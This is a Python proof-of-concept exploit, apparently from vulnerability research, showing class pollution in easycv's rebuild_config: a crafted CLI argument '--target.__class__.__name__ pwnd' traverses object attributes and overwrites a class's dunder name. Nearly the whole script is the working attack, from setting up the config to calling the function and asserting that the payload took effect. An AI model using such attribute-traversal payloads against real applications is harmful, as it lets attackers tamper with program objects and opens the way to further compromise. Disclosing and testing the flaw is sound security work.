# CLASS POLLUTION PROOF OF CONCEPT (PoC) - Local Trigger
# Class Pollution Func: rebuild_config (via CLI --key value args)
# Type: get-attr-set-attr
# Trigger: python tools/export.py --target.__class__.__name__ pwnd

from easycv.utils.config_tools import rebuild_config
from mmcv import Config
import tempfile, os

class Target: pass
target = Target()

# Create a minimal config file
tmp = tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False)
tmp.write("target = None\n")
tmp.close()

cfg = Config.fromfile(tmp.name)
cfg.target = target
os.unlink(tmp.name)

payload_value = "pwnd"

def run_poc():
  # Simulates CLI: python tools/export.py --target.__class__.__name__ pwnd
  cli_args = ["--target.__class__.__name__", payload_value]
  rebuild_config(cfg, cli_args)

def verify_poc():
  assert target.__class__.__name__ != payload_value, "Pre-condition failed"
  run_poc()
  print(f"After: target.__class__.__name__ = {target.__class__.__name__}")
  assert target.__class__.__name__ == payload_value, "Class pollution failed!"
  print("[Pass] Class pollution PoC verified! (local trigger)")

if __name__ == "__main__":
  verify_poc()
